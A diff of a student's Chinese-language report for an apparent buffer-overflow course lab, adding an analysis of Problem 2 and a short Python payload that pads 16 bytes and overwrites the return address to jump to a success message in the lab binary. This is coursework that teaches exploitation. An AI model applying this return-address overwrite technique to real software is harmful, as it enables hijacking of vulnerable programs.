@@ -50,13 +50,25 @@
 
 - **结果**：
 
-![problem 1](img/image.png)
+![problem1结果](img/image-1.png)
 
 ### Problem 2:
 
-- **分析**：...
-- **解决方案**：payload 是什么，即你的 python 代码 or 其他能体现你 payload 信息的代码/图片
-- **结果**：附上图片
+- **分析**：同上题类似，只不过现在目标函数 func2 会校验变量 x 的值是否为 1016，但 x 储存在栈上的位置距离 buffer 太远，memcpy 函数限制了拷贝长度，无法通过简单的栈溢出覆盖到 x 的值，尝试直接跳转到 func2 输出`Yes! I like ICS!`的位置。也就是下图的 0x40124c 处。
+
+![print](img/image-3.png)
+
+- **解决方案**：
+
+  ```python
+      padding = b"A" * 16
+      func2_address = b"\x4c\x12\x40\x00\x00\x00\x00\x00"  # 小端地址
+      payload = padding+ func2_address
+  ```
+
+- **结果**：
+
+![problem2结果](img/image-2.png)
 
 ### Problem 3:
 
@@ -72,6 +84,12 @@
 
 ## 思考与总结
 
+非常好的 lab 使我的汇编旋转
+
+## 反馈
+
+problem2 我是逃课了吗（笑）似乎 Nxenabled 并没有起作用
+
 ## 参考资料
 
-列出在准备报告过程中参考的所有文献、网站或其他资源，确保引用格式正确。
+csapp
